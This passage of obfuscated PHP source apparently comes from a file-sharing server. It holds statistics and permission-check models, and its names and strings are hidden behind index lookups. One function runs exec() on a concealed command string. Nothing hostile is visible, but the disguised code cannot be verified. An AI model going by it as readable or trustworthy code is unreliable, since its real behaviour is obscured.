$õ­ŠÆ™»[$„àãº¹Ö[1822]] += $õ­ŠÆ™»[$„àãº¹Ö[1817]]; $õ­ŠÆ™»[$„àãº¹Ö[1819]] = $„àãº¹Ö[12]; $this->update(); } public function zipEvent($Ù“ïöŒ‘, $Îóøå€È, $ÃÜÏÖî, $ù“ÓÓÍ) { $õ…ÁÁÏŠ =& $_SERVER[Ş­ğŠìÒ]; $Ïë×Œïç =& $this->task; $Ïë×Œïç[$õ…ÁÁÏŠ[1815]] = get_path_this($Îóøå€È); $Ïë×Œïç[$õ…ÁÁÏŠ[1817]] = $ù“ÓÓÍ; $Ïë×Œïç[$õ…ÁÁÏŠ[1818]] = $ÃÜÏÖî; $Ïë×Œïç[$õ…ÁÁÏŠ[1139]] = $Ù“ïöŒ‘ == $õ…ÁÁÏŠ[1890] ? $õ…ÁÁÏŠ[1885] : $õ…ÁÁÏŠ[1886]; $Ïë×Œïç[$õ…ÁÁÏŠ[1819]] = $õ…ÁÁÏŠ[12]; $Ïë×Œïç[$õ…ÁÁÏŠ[830]] = $ù“ÓÓÍ; $Ïë×Œïç[$õ…ÁÁÏŠ[1882]] = $õ…ÁÁÏŠ[389]; $this->update(); } public function nameParse($…˜¯äà) { $»Âè¿¾ =& $_SERVER[Ş­ğŠìÒ]; $¦ğí½„Š =& $this->task; if ($¦ğí½„Š[$»Âè¿¾[1765]] < $¦ğí½„Š[$»Âè¿¾[1137]]) { $óÓ×¯ÜÊ = get_path_this($…˜¯äà); if (strstr($óÓ×¯ÜÊ, $»Âè¿¾[10])) { $¦ğí½„Š[$»Âè¿¾[1765]] += 1; } } if ($¦ğí½„Š[$»Âè¿¾[1882]] == $»Âè¿¾[1275]) { $¦ğí½„Š[$»Âè¿¾[1882]] = $»Âè¿¾[389]; } $¦ğí½„Š[$»Âè¿¾[1815]] = $…˜¯äà; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($×¿Á¢Ûß) { $ÏŠ§¦Êí =& $_SERVER[Ş­ğŠìÒ]; $ûôş®Å° = array($ÏŠ§¦Êí[662] => array($ÏŠ§¦Êí[33] => $ÏŠ§¦Êí[1891], $ÏŠ§¦Êí[350] => array($ÏŠ§¦Êí[255], $ÏŠ§¦Êí[832], $ÏŠ§¦Êí[1892], $ÏŠ§¦Êí[1893])), $ÏŠ§¦Êí[1894] => array($ÏŠ§¦Êí[33] => $ÏŠ§¦Êí[1895], $ÏŠ§¦Êí[350] => array($ÏŠ§¦Êí[255], $ÏŠ§¦Êí[830], $ÏŠ§¦Êí[1896], $ÏŠ§¦Êí[1897], $ÏŠ§¦Êí[1898]))); if (!isset($ûôş®Å°[$×¿Á¢Ûß])) { return !1; } $this->optionType = $ûôş®Å°[$×¿Á¢Ûß][$ÏŠ§¦Êí[33]]; $this->field = $ûôş®Å°[$×¿Á¢Ûß][$ÏŠ§¦Êí[350]]; return !0; } public function listData($‘—˜¬Ñë = false, $ÊÔÛÄŠ = "\155\x6f\144\151\146\171\x54\x69\x6d\145", $¦œ´êú = false) { return parent::listData($‘—˜¬Ñë, $ÊÔÛÄŠ, $¦œ´êú); } public function trendList($ÇÅÔ­İ) { $ß«³³Õ˜ =& $_SERVER[Ş­ğŠìÒ]; $ÑŠò÷÷ƒ = $this->listData(); if ($ÑŠò÷÷ƒ) { $êç©é¹ = end($ÑŠò÷÷ƒ); $ï¼ô‘æ = date($ß«³³Õ˜[1899], strtotime($ß«³³Õ˜[1900])); if ($êç©é¹[$ß«³³Õ˜[255]] == $ï¼ô‘æ) { return $ÑŠò÷÷ƒ; } $ÃŞ´Èõî = strtotime($êç©é¹[$ß«³³Õ˜[255]]); } if (!isset($ÃŞ´Èõî)) { $ĞÈÓÃæĞ = $ÇÅÔ­İ == $ß«³³Õ˜[662] ? $ß«³³Õ˜[598] : $ß«³³Õ˜[891]; $ÃŞ´Èõî = Model($ĞÈÓÃæĞ)->min($ß«³³Õ˜[231]); } $ŸÊìĞî = $ß«³³Õ˜[1901] . ucfirst($ÇÅÔ­İ); $¦¬ŞïÅ† = $this->dateList($ÃŞ´Èõî); foreach ($¦¬ŞïÅ† as $ï¼ô‘æ) { $this->{$ŸÊìĞî}($ï¼ô‘æ); } return $this->listData(); } private function dateList($Ú¸áÃø¥) { $ºÏöìä =& $_SERVER[Ş­ğŠìÒ]; $°§˜áÍ = $Ú¸áÃø¥; $ã–õ«÷Ş = strtotime($ºÏöìä[1900]); $½üÄ¹öŸ = array(); while ($°§˜áÍ <= $ã–õ«÷Ş) { $½üÄ¹öŸ[] = date($ºÏöìä[1899], $°§˜áÍ); $°§˜áÍ = strtotime($ºÏöìä[1902], $°§˜áÍ); } return $½üÄ¹öŸ; } public function _recordUser($ŒçïÉƒÎ = '') { $…Âøƒ“• =& $_SERVER[Ş­ğŠìÒ]; $Ä¢ˆÛª¹ = strtotime(date($…Âøƒ“•[1903], strtotime($ŒçïÉƒÎ))); $‡–ÕÄ€È = strtotime(date($…Âøƒ“•[1904], strtotime($ŒçïÉƒÎ))); $âªüÍØï = array($…Âøƒ“•[231] => array($…Âøƒ“•[1087], $‡–ÕÄ€È)); $ö«Œò¦¦ = Model($…Âøƒ“•[598])->where($âªüÍØï)->count($…Âøƒ“•[1764]); $âªüÍØï[$…Âøƒ“•[231]] = array($…Âøƒ“•[409], array($Ä¢ˆÛª¹, $‡–ÕÄ€È)); $å™øòƒı = Model($…Âøƒ“•[598])->where($âªüÍØï)->count($…Âøƒ“•[1764]); $âªüÍØï[$…Âøƒ“•[33]] = $…Âøƒ“•[1905]; $€Ëèí¼ = Model($…Âøƒ“•[1906])->where($âªüÍØï)->count($…Âøƒ“•[1907]); $Å§ã©Éá = array($…Âøƒ“•[255] => $ŒçïÉƒÎ, $…Âøƒ“•[832] => (int) $ö«Œò¦¦, $…Âøƒ“•[1892] => (int) $å™øòƒı, $…Âøƒ“•[1893] => (int) $€Ëèí¼); return $this->insert($Å§ã©Éá); } public function _recordStore($øèğ†Æ = '') { $Ì‘şš°‘ =& $_SERVER[Ş­ğŠìÒ]; $Ñè–ïÅì = strtotime(date($Ì‘şš°‘[1904], strtotime($øèğ†Æ))); $üåùï Î = array($Ì‘şš°‘[231] => array($Ì‘şš°‘[1087], $Ñè–ïÅì)); $ÁÀ¯óÅ• = Model($Ì‘şš°‘[544])->where($üåùï Î)->sum($Ì‘şš°‘[79]); $üåùï Î[$Ì‘şš°‘[485]] = 0; $œ‡ìŒ”à = Model($Ì‘şš°‘[891])->where($üåùï Î)->sum($Ì‘şš°‘[79]); $üåùï Î[$Ì‘şš°‘[190]] = 1; $†–”µÑ = Model($Ì‘şš°‘[891])->where($üåùï Î)->sum($Ì‘şš°‘[79]); $üåùï Î[$Ì‘şš°‘[190]] = 2; $Áâ¤ãÀ¶ = Model($Ì‘şš°‘[891])->where($üåùï Î)->sum($Ì‘şš°‘[79]); $óÄüå»° = array($Ì‘şš°‘[255] => $øèğ†Æ, $Ì‘şš°‘[830] => (int) $œ‡ìŒ”à, $Ì‘şš°‘[1896] => (int) $ÁÀ¯óÅ•, $Ì‘şš°‘[1897] => (int) $†–”µÑ, $Ì‘şš°‘[1898] => (int) $Áâ¤ãÀ¶); return $this->insert($óÄüå»°); } public function trend($ŞäÚè¢Ò, $í‹—ä‘¥) { $ùÅ±š“é =& $_SERVER[Ş­ğŠìÒ]; if (!$this->init($ŞäÚè¢Ò)) { return !1; } $³²½¦†Ğ = $this->trendList($ŞäÚè¢Ò); if ($³²½¦†Ğ && $í‹—ä‘¥ != $ùÅ±š“é[1737]) { $òšÒ—‚ = $³²½¦†Ğ[0][$ùÅ±š“é[255]]; $Àë˜º½ö = $this->validDate($í‹—ä‘¥, $òšÒ—‚); $º¬œé½° = array(); $…½Öˆ”ı = array_to_keyvalue($³²½¦†Ğ, $ùÅ±š“é[255]); foreach ($Àë˜º½ö as $ºˆ»ûûì) { if (isset($…½Öˆ”ı[$ºˆ»ûûì])) { $á™æ¯õ = $…½Öˆ”ı[$ºˆ»ûûì]; } else { $á™æ¯õ = end($³²½¦†Ğ); $á™æ¯õ[$ùÅ±š“é[255]] = $ºˆ»ûûì; if ($ŞäÚè¢Ò == $ùÅ±š“é[662]) { $á™æ¯õ[$ùÅ±š“é[1892]] = $á™æ¯õ[$ùÅ±š“é[1893]] = 0; } } $º¬œé½°[] = $á™æ¯õ; } $³²½¦†Ğ = $º¬œé½°; } $ñİ†·é = array($ùÅ±š“é[662] => array($ùÅ±š“é[832] => LNG($ùÅ±š“é[1908]), $ùÅ±š“é[1892] => LNG($ùÅ±š“é[1909]), $ùÅ±š“é[1893] => LNG($ùÅ±š“é[1910])), $ùÅ±š“é[1894] => array($ùÅ±š“é[830] => LNG($ùÅ±š“é[1911]), $ùÅ±š“é[1896] => LNG($ùÅ±š“é[1912]), $ùÅ±š“é[1897] => LNG($ùÅ±š“é[1913]), $ùÅ±š“é[1898] => LNG($ùÅ±š“é[1914]))); $ÚàÅì„“ = array($ùÅ±š“é[662] => $ùÅ±š“é[1915], $ùÅ±š“é[1894] => $ùÅ±š“é[79]); if (empty($³²½¦†Ğ)) { $ºˆ»ûûì = date($ùÅ±š“é[1899], strtotime($ùÅ±š“é[1900])); $”ûŒ¤øÚ = array($ùÅ±š“é[255] => $ºˆ»ûûì); foreach ($ñİ†·é[$ŞäÚè¢Ò] as $œƒ€ûÌ… => $¡Ø¼§æî) { $”ûŒ¤øÚ[$œƒ€ûÌ…] = 0; } $³²½¦†Ğ[] = $”ûŒ¤øÚ; } $ëåáÆñÆ = array(); foreach ($³²½¦†Ğ as $¡Ø¼§æî) { if ($ŞäÚè¢Ò == $ùÅ±š“é[1894] && $¡Ø¼§æî[$ùÅ±š“é[1896]] > $¡Ø¼§æî[$ùÅ±š“é[830]]) { $¡Ø¼§æî[$ùÅ±š“é[1896]] = $¡Ø¼§æî[$ùÅ±š“é[830]]; } foreach ($ñİ†·é[$ŞäÚè¢Ò] as $œƒ€ûÌ… => $°¯ÅÔ·î) { $á™æ¯õ = array($ùÅ±š“é[255] => $¡Ø¼§æî[$ùÅ±š“é[255]], $ùÅ±š“é[1653] => $°¯ÅÔ·î); $á™æ¯õ[$ÚàÅì„“[$ŞäÚè¢Ò]] = isset($¡Ø¼§æî[$œƒ€ûÌ…]) ? $¡Ø¼§æî[$œƒ€ûÌ…] : 0; $ëåáÆñÆ[] = $á™æ¯õ; } } return $ëåáÆñÆ; } public function validDate($ø°Í³Ó¹, $Õûö…) { $¢¹áÒ° =& $_SERVER[Ş­ğŠìÒ]; $òåÕ°ò = date($¢¹áÒ°[1899], strtotime($¢¹áÒ°[1900])); $ÆçªÒ¦ = array($òåÕ°ò); switch ($ø°Í³Ó¹) { case $¢¹áÒ°[1744]: $áØ·Ò¯ = mktime(0, 0, 0, date($¢¹áÒ°[1916]), date($¢¹áÒ°[1445]) - date($¢¹áÒ°[1535]) + 7 - 7, date($¢¹áÒ°[1917])); $©Üîüš… = 0; do { $µÆÎûÍë = date($¢¹áÒ°[1899], $áØ·Ò¯ - 3600 * 24 * 7 * $©Üîüš…); $ÆçªÒ¦[] = $µÆÎûÍë; $©Üîüš…++; } while ($Õûö… < $µÆÎûÍë); break; case $¢¹áÒ°[1742]: $©Üîüš… = 1; do { $ÕŠ†ßüÎ = date($¢¹áÒ°[1918], strtotime("\x2d\40{$©Üîüš…}\40\x6d\157\x6e\x74\x68\x73")); $ÆçªÒ¦[] = $ÕŠ†ßüÎ; $©Üîüš…++; } while ($Õûö… < $ÕŠ†ßüÎ); break; case $¢¹áÒ°[1919]: $ŞÑà÷Áñ = (int) date($¢¹áÒ°[1917], strtotime($Õûö…)); $ÌœÌÍ » = (int) date($¢¹áÒ°[1917]); if ($ŞÑà÷Áñ >= $ÌœÌÍ ») { break; } for ($ŞÑà÷Áñ; $ŞÑà÷Áñ < $ÌœÌÍ »; $ŞÑà÷Áñ++) { $ÆçªÒ¦[] = $ŞÑà÷Áñ . $¢¹áÒ°[1920]; } break; default: break; } if ($Õûö… > end($ÆçªÒ¦)) { array_pop($ÆçªÒ¦); } sort($ÆçªÒ¦); return $ÆçªÒ¦; } public function listTable($¶¬¢½¡•) { $¬¹·ìœ‡ = ucfirst($¶¬¢½¡•); return Model($¬¹·ìœ‡)->listData(); } public function option($êîĞê¤×) { $ÑâéÕöß = $_SERVER[Ş­ğŠìÒ][1921] . ucfirst($êîĞê¤×); return $this->{$ÑâéÕöß}(); } private function optionUser() { $ ú£×ìÊ =& $_SERVER[Ş­ğŠìÒ]; $ĞŒ¹ÎÏø = Model($ ú£×ìÊ[598])->count($ ú£×ìÊ[1764]); $òüõ½¬Î = Model($ ú£×ìÊ[598])->where($ ú£×ìÊ[1922])->count($ ú£×ìÊ[1764]); $´Ëàé¢ = intval($GLOBALS[$ ú£×ìÊ[6]][$ ú£×ìÊ[425]][$ ú£×ìÊ[1710]]) / 3600; $ğšÀ©ô = strtotime("\55{$´Ëàé¢}\x20\150\x6f\x75\x72\x73"); $»ÀĞŞª = strtotime(date($ ú£×ìÊ[1903])); if ($ğšÀ©ô < $»ÀĞŞª) { $ğšÀ©ô = $»ÀĞŞª; } $ëÓ±»‡ = array($ ú£×ìÊ[1923] => array($ ú£×ìÊ[1088], $ğšÀ©ô)); $—¥ÄŠ” = (int) Model($ ú£×ìÊ[598])->where($ëÓ±»‡)->count($ ú£×ìÊ[1764]); if (!$—¥ÄŠ”) { $—¥ÄŠ” = 1; } $ëÓ±»‡ = array($ ú£×ìÊ[1923] => array($ ú£×ìÊ[1088], $»ÀĞŞª)); $èşé…Ç÷ = Model($ ú£×ìÊ[598])->where($ëÓ±»‡)->count($ ú£×ìÊ[1764]); return array($ ú£×ìÊ[825] => (int) $ĞŒ¹ÎÏø, $ ú£×ìÊ[1924] => (int) ($ĞŒ¹ÎÏø - $òüõ½¬Î), $ ú£×ìÊ[1925] => (int) $òüõ½¬Î, $ ú£×ìÊ[1926] => (int) $èşé…Ç÷, $ ú£×ìÊ[1927] => $—¥ÄŠ”); } private function optionFile() { $•ê¤¬¸„ =& $_SERVER[Ş­ğŠìÒ]; $ŞŠÇà†€ = $this->sourceSize(); $Õ£„êÏŞ = $ŞŠÇà†€[$•ê¤¬¸„[79]]; $È–¿¾¾ = $ŞŠÇà†€[$•ê¤¬¸„[1896]]; $çüÔİâ” = Model($•ê¤¬¸„[891])->where(array($•ê¤¬¸„[485] => 0))->count($•ê¤¬¸„[193]); $—ªü†Ö = array($•ê¤¬¸„[485] => 0, $•ê¤¬¸„[231] => array($•ê¤¬¸„[1088], strtotime(date($•ê¤¬¸„[1903])))); $ºÃÎÆ¿Ì = Model($•ê¤¬¸„[891])->where($—ªü†Ö)->sum($•ê¤¬¸„[79]); $©—Ş¤ = Model($•ê¤¬¸„[891])->where($—ªü†Ö)->count($•ê¤¬¸„[193]); return array($•ê¤¬¸„[830] => $Õ£„êÏŞ, $•ê¤¬¸„[1896] => $È–¿¾¾, $•ê¤¬¸„[1928] => $Õ£„êÏŞ - $È–¿¾¾, $•ê¤¬¸„[1929] => (int) $ºÃÎÆ¿Ì, $•ê¤¬¸„[832] => (int) $çüÔİâ”, $•ê¤¬¸„[1930] => (int) $©—Ş¤); } private function optionAccess() { $ƒ½›ÁŠª =& $_SERVER[Ş­ğŠìÒ]; return array($ƒ½›ÁŠª[825] => $this->typeLogCnt(), $ƒ½›ÁŠª[110] => $this->typeLogCnt($ƒ½›ÁŠª[110]), $ƒ½›ÁŠª[525] => $this->typeLogCnt($ƒ½›ÁŠª[525]), $ƒ½›ÁŠª[1931] => $this->typeLogCnt($ƒ½›ÁŠª[1931]), $ƒ½›ÁŠª[1932] => $this->typeLogCnt($ƒ½›ÁŠª[1932]), $ƒ½›ÁŠª[662] => $this->typeLogCnt($ƒ½›ÁŠª[12], $ƒ½›ÁŠª[1907])); } private function typeLogCnt($÷ºü¸¿† = '', $òß¹ÀÓ§ = "\x69\144") { $ïÂş³ĞÍ =& $_SERVER[Ş­ğŠìÒ]; $äÏëÁõ = array($ïÂş³ĞÍ[110] => array($ïÂş³ĞÍ[1933], $ïÂş³ĞÍ[1934]), $ïÂş³ĞÍ[525] => array($ïÂş³ĞÍ[1935], $ïÂş³ĞÍ[1936]), $ïÂş³ĞÍ[1931] => array($ïÂş³ĞÍ[1937], $ïÂş³ĞÍ[1938], $ïÂş³ĞÍ[1939]), $ïÂş³ĞÍ[1932] => array($ïÂş³ĞÍ[1940], $ïÂş³ĞÍ[1941]), $ïÂş³ĞÍ[1942] => array($ïÂş³ĞÍ[1943], $ïÂş³ĞÍ[1944], $ïÂş³ĞÍ[1945])); $ßÖâÎ»ò = strtotime(date($ïÂş³ĞÍ[1903])); $¡ê‹šªƒ = array($ïÂş³ĞÍ[231] => array($ïÂş³ĞÍ[1088], $ßÖâÎ»ò)); if ($÷ºü¸¿†) { $¡ê‹šªƒ[$ïÂş³ĞÍ[33]] = array($ïÂş³ĞÍ[7], $äÏëÁõ[$÷ºü¸¿†]); } $Ç¯’´¨¡ = Model($ïÂş³ĞÍ[1906])->where($¡ê‹šªƒ)->count($òß¹ÀÓ§); return (int) $Ç¯’´¨¡; } private function optionServer() { $‘æ»Õ¤¯ =& $_SERVER[Ş­ğŠìÒ]; $ÈÂï¬Ë = $this->diskDriver(); $’óÉÉ³“ = KodIO::defaultDriver(); $“‘İÊÚ÷ = array($‘æ»Õ¤¯[884] => $’óÉÉ³“[$‘æ»Õ¤¯[475]]); $àà§Ïˆí = Model($‘æ»Õ¤¯[544])->where($“‘İÊÚ÷)->sum($‘æ»Õ¤¯[79]); $¬€ûú”£ = explode($‘æ»Õ¤¯[53], $_SERVER[$‘æ»Õ¤¯[147]]); $¿–¤Ú³  = $¬€ûú”£[0]; $á¿¢‹Êö = $GLOBALS[$‘æ»Õ¤¯[6]][$‘æ»Õ¤¯[21]]; $”ĞàÛ¯Ä = $á¿¢‹Êö[$‘æ»Õ¤¯[1050]]; if ($”ĞàÛ¯Ä == $‘æ»Õ¤¯[1038]) { $ß¬é¢–¾ = explode($‘æ»Õ¤¯[1364], $á¿¢‹Êö[$‘æ»Õ¤¯[1049]]); $”ĞàÛ¯Ä = $ß¬é¢–¾[0]; } if ($”ĞàÛ¯Ä == $‘æ»Õ¤¯[986] || $”ĞàÛ¯Ä == $‘æ»Õ¤¯[871]) { $û­Í®à¦ = Model()->db()->query($‘æ»Õ¤¯[1946]); $Àİ„˜‰ñ = $û­Í®à¦[0] && isset($û­Í®à¦[0][$‘æ»Õ¤¯[1652]]) ? $û­Í®à¦[0][$‘æ»Õ¤¯[1652]] : 0; $”ĞàÛ¯Ä = $‘æ»Õ¤¯[1947] . ($Àİ„˜‰ñ ? $‘æ»Õ¤¯[8] . $Àİ„˜‰ñ : $‘æ»Õ¤¯[12]); } $ó°®Í“ô = $GLOBALS[$‘æ»Õ¤¯[6]][$‘æ»Õ¤¯[425]][$‘æ»Õ¤¯[893]]; return array($‘æ»Õ¤¯[1948] => $ÈÂï¬Ë ? $ÈÂï¬Ë[$‘æ»Õ¤¯[1949]] : 0, $‘æ»Õ¤¯[1950] => $ÈÂï¬Ë ? $ÈÂï¬Ë[$‘æ»Õ¤¯[1951]] : 0, $‘æ»Õ¤¯[1952] => (int) $’óÉÉ³“[$‘æ»Õ¤¯[1949]] * 1024 * 1024 * 1024, $‘æ»Õ¤¯[1953] => (int) $àà§Ïˆí, $‘æ»Õ¤¯[1954] => ucfirst($¿–¤Ú³ ), $‘æ»Õ¤¯[1955] => $‘æ»Õ¤¯[1956] . PHP_VERSION, $‘æ»Õ¤¯[1957] => phpBuild64() ? 64 : 32, $‘æ»Õ¤¯[824] => str_replace($‘æ»Õ¤¯[1207], $‘æ»Õ¤¯[1066], $”ĞàÛ¯Ä), $‘æ»Õ¤¯[425] => ucfirst($ó°®Í“ô), $‘æ»Õ¤¯[32] => $_SERVER[$‘æ»Õ¤¯[1958]]); } private function diskDriver() { $ÒÃşÀÍø =& $_SERVER[Ş­ğŠìÒ]; $Õä§Å = $ÒÃşÀÍø[8]; $‹¯ˆˆğ = $GLOBALS[$ÒÃşÀÍø[6]][$ÒÃşÀÍø[1381]] == $ÒÃşÀÍø[1382]; if ($‹¯ˆˆğ) { $Õä§Å = $ÒÃşÀÍø[1959]; if (function_exists($ÒÃşÀÍø[1960])) { exec($ÒÃşÀÍø[1961], $°Æâ±¢Ş); $Õä§Å = $°Æâ±¢Ş[1] . $ÒÃşÀÍø[8]; } } if (!file_exists($Õä§Å)) { return; } if (!function_exists($ÒÃşÀÍø[1962])) { return; } $Ñí¢óÇ¡ = @disk_total_space($Õä§Å); $¡Ø¿—£ = $Ñí¢óÇ¡ - @disk_free_space($Õä§Å); return array($ÒÃşÀÍø[1949] => $Ñí¢óÇ¡, $ÒÃşÀÍø[1951] => $¡Ø¿—£); } public function fileChart($ÒÂôıİ·) { $ôû‡öóŠ =& $_SERVER[Ş­ğŠìÒ]; if (isset($ÒÂôıİ·[$ôû‡öóŠ[1764]])) { return Model($ôû‡öóŠ[891])->userFileTypeProfile($ÒÂôıİ·[$ôû‡öóŠ[1764]]); } if (isset($ÒÂôıİ·[$ôû‡öóŠ[1963]])) { return Model($ôû‡öóŠ[891])->groupFileTypeProfile($ÒÂôıİ·[$ôû‡öóŠ[1963]]); } $²£ÅÁˆÍ = $this->sourceSize(); $ùÖˆ¬Ü« = array($ôû‡öóŠ[192] => 0, $ôû‡öóŠ[190] => 1); $ë¬¥€ = Model($ôû‡öóŠ[891])->where($ùÖˆ¬Ü«)->sum($ôû‡öóŠ[79]); $ùÖˆ¬Ü«[$ôû‡öóŠ[190]] = 2; $ä„Ê¹Ó¬ = Model($ôû‡öóŠ[891])->where($ùÖˆ¬Ü«)->sum($ôû‡öóŠ[79]); return array($ôû‡öóŠ[830] => $²£ÅÁˆÍ[$ôû‡öóŠ[79]], $ôû‡öóŠ[1896] => $²£ÅÁˆÍ[$ôû‡öóŠ[1896]], $ôû‡öóŠ[1897] => (int) $ë¬¥€, $ôû‡öóŠ[1898] => (int) $ä„Ê¹Ó¬); } private function sourceSize() { $ÜÙáŒ =& $_SERVER[Ş­ğŠìÒ]; $§ÊÙÙô‡ = Model($ÜÙáŒ[891])->where(array($ÜÙáŒ[485] => 0))->sum($ÜÙáŒ[79]); $–’–Ø’³ = Model($ÜÙáŒ[544])->sum($ÜÙáŒ[79]); if ($–’–Ø’³ > $§ÊÙÙô‡) { $–’–Ø’³ = $§ÊÙÙô‡; } return array($ÜÙáŒ[79] => (int) $§ÊÙÙô‡, $ÜÙáŒ[1896] => (int) $–’–Ø’³); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¸·÷´ñ =& $_SERVER[Ş­ğŠìÒ]; $ßé’ô©Ê = array(array($¸·÷´ñ[494] => LNG($¸·÷´ñ[1964]), $¸·÷´ñ[1965] => $¸·÷´ñ[1966], $¸·÷´ñ[1967] => 1, $¸·÷´ñ[1968] => 1, $¸·÷´ñ[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¸·÷´ñ[494] => LNG($¸·÷´ñ[1970]), $¸·÷´ñ[1965] => $¸·÷´ñ[1971], $¸·÷´ñ[1967] => 2, $¸·÷´ñ[1968] => 1, $¸·÷´ñ[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¸·÷´ñ[494] => LNG($¸·÷´ñ[1972]), $¸·÷´ñ[1965] => $¸·÷´ñ[1973], $¸·÷´ñ[1967] => 3, $¸·÷´ñ[1968] => 1, $¸·÷´ñ[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¸·÷´ñ[494] => LNG($¸·÷´ñ[1974]), $¸·÷´ñ[1965] => $¸·÷´ñ[1975], $¸·÷´ñ[1967] => 4, $¸·÷´ñ[1968] => 1, $¸·÷´ñ[1969] => self::AUTH_SHOW | self::AUTH_VIEW), array($¸·÷´ñ[494] => LNG($¸·÷´ñ[1976]), $¸·÷´ñ[1965] => $¸·÷´ñ[1977], $¸·÷´ñ[1967] => 5, $¸·÷´ñ[1968] => 1, $¸·÷´ñ[1969] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¸·÷´ñ[494] => LNG($¸·÷´ñ[1978]), $¸·÷´ñ[1965] => $¸·÷´ñ[1979], $¸·÷´ñ[1967] => 6, $¸·÷´ñ[1968] => 1, $¸·÷´ñ[1969] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¸·÷´ñ[494] => LNG($¸·÷´ñ[1980]), $¸·÷´ñ[1965] => $¸·÷´ñ[1981], $¸·÷´ñ[1967] => 7, $¸·÷´ñ[1968] => 1, $¸·÷´ñ[1969] => 0)); return $ßé’ô©Ê; } public static function authCheck($öÜ«²Îç, $ÅËã†Ë¥) { $ôíÕ¿€Â =& $_SERVER[Ş­ğŠìÒ]; $öÜ«²Îç = intval($öÜ«²Îç); if (KodUser::isRoot() && $GLOBALS[$ôíÕ¿€Â[6]][$ôíÕ¿€Â[1982]]) { return !0; } if ($öÜ«²Îç <= 0) { return !1; } if (($öÜ«²Îç & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($öÜ«²Îç & $ÅËã†Ë¥); } public static function authCheckShow($”²ƒçüŸ) { return self::authCheck($”²ƒçüŸ, self::AUTH_SHOW); } public static function authCheckView($’ÔüúúÚ) { return self::authCheck($’ÔüúúÚ, self::AUTH_VIEW); } public static function authCheckDownload($²ÚõõÀÄ) { return self::authCheck($²ÚõõÀÄ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($êó´Î„‘) { return self::authCheck($êó´Î„‘, self::AUTH_UPLOAD); } public static function authCheckEdit($Š€ØÀ®œ) { return self::authCheck($Š€ØÀ®œ, self::AUTH_EDIT); } public static function authCheckRemove($‹Ê÷‚êÇ) { return self::authCheck($‹Ê÷‚êÇ, self::AUTH_REMOVE); } public static function authCheckShare($ùÁÄÓÍò) { return self::authCheck($ùÁÄÓÍò, self::AUTH_SHARE); } public static function authCheckComment($Ãúøæ”) { return self::authCheck($Ãúøæ”, self::AUTH_COMMENT); } public static function authCheckEvent($Ìß±¹ºó) { return self::authCheck($Ìß±¹ºó, self::AUTH_EVENT); } public static function authCheckRoot($”çø€Ÿ‰) { return self::authCheck($”çø€Ÿ‰, self::AUTH_ROOT); } public static function authCheckAction($Óã¼Í¤Ÿ, $ñÆôñˆŞ) { $Ëî‹´Ã =& $_SERVER[Ş­ğŠìÒ]; $êúÚ‰†ï = array($Ëî‹´Ã[1983] => self::AUTH_VIEW, $Ëî‹´Ã[1275] => self::AUTH_DOWNLOAD, $Ëî‹´Ã[110] => self::AUTH_UPLOAD, $Ëî‹´Ã[1932] => self::AUTH_EDIT, $Ëî‹´Ã[1931] => self::AUTH_REMOVE, $Ëî‹´Ã[1942] => self::AUTH_SHARE, $Ëî‹´Ã[430] => self::AUTH_COMMENT, $Ëî‹´Ã[1752] => self::AUTH_EVENT, $Ëî‹´Ã[1984] => self::AUTH_ROOT); if (!isset($êúÚ‰†ï[$ñÆôñˆŞ])) { return; } $–¿ı¥Ñà = $êúÚ‰†ï[$ñÆôñˆŞ]; $Óã¼Í¤Ÿ = intval($Óã¼Í¤Ÿ); if ($Óã¼Í¤Ÿ <= 0) { return !1; } if (($Óã¼Í¤Ÿ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Óã¼Í¤Ÿ & $–¿ı¥Ñà); } public static function authDisable($¿óîÁ³, $í€œ»Ä€) { if (intval($¿óîÁ³) <= 0) { return 0; } return intval($¿óîÁ³) & ~$í€œ»Ä€; } public $optionType = "\123\171\x73\x74\145\x6d\x2e\x73\x6f\165\x72\x63\x65\x41\x75\164\x68\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\141\x75\164\x68", "\154\x61\142\145\154", "\144\x69\163\x70\x6c\141\x79", "\x73\171\x73\x74\145\155", "\163\157\162\164"); public function initData() { $†¡Æ¶´ = $this->authDefault(); foreach ($†¡Æ¶´ as $Ú—ƒ¼öŒ) { $this->add($Ú—ƒ¼öŒ); } } public function findAuth($äèè‚çó, $®ş­‰­ñ) { $µ‡º¦îæ =& $_SERVER[Ş­ğŠìÒ]; $èØşó²Â = parent::listData(); foreach ($èØşó²Â as $æÒ­’) { $¼ğõ“ = intval($æÒ­’[$µ‡º¦îæ[487]]); if ($¼ğõ“ <= 0 || $æÒ­’[$µ‡º¦îæ[1985]] == 0) { continue; } if (($¼ğõ“ & $äèè‚çó) != $äèè‚çó) { continue; } if (($¼ğõ“ & $®ş­‰­ñ) != 0) { continue; } return $æÒ­’[$µ‡º¦îæ[475]]; } return !1; } public function findAuthReadOnly() { 